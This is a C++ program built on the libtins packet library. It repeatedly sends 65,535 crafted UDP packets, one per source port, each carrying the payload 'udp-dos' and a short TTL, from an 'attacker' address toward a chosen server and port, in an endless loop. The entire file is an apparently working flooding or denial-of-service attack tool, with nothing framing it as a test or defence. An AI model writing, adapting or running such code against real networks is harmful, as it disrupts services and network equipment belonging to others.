#include <cstdio>
#include <cstdlib>
#include <iostream>
#include <string>
#include <sys/time.h>
#include <unistd.h>

#include <tins/tins.h>

using namespace std;
using namespace Tins;

namespace {
const uint16_t kStartPort = 1;
const uint16_t kEndPort = 65535;
const char kPayload[] = "udp-dos";
}  // namespace

double __get_us(struct timeval t) {
    return (t.tv_sec * 1000000 + t.tv_usec);
}

int main(int argc, char** argv) {
    if (argc != 5) {
        cout << "wrong number of args ---> "
             << "(attacker_private_ip, remote_server_ip, remote_server_port, "
             << "packet_iface)" << endl;
        return 0;
    }

    const IPv4Address attacker_private_ip(argv[1]);
    const IPv4Address remote_server_ip(argv[2]);
    const uint16_t remote_server_port = atoi(argv[3]);
    const string packet_iface = argv[4];

    IP udp_pkts[70000];
    for (int i = kStartPort; i <= kEndPort; i++) {
        udp_pkts[i] =
            IP(remote_server_ip, attacker_private_ip) /
            UDP(remote_server_port, i) /
            RawPDU(string(kPayload));
        udp_pkts[i].rfind_pdu<IP>().ttl(5);
    }

    PacketSender sender;
    NetworkInterface iface(packet_iface);
    while (true) {
        cout << remote_server_ip << endl;
        struct timeval start_time, stop_time;
        gettimeofday(&start_time, NULL);
        for (int i = kStartPort; i <= kEndPort; i++) {
            sender.send(udp_pkts[i], iface);
            usleep(10);
        }
        gettimeofday(&stop_time, NULL);
        printf("finished using time: %f ms\n",
               (__get_us(stop_time) - __get_us(start_time)) / 1000);
        sleep(2);
    }

    return 0;
}
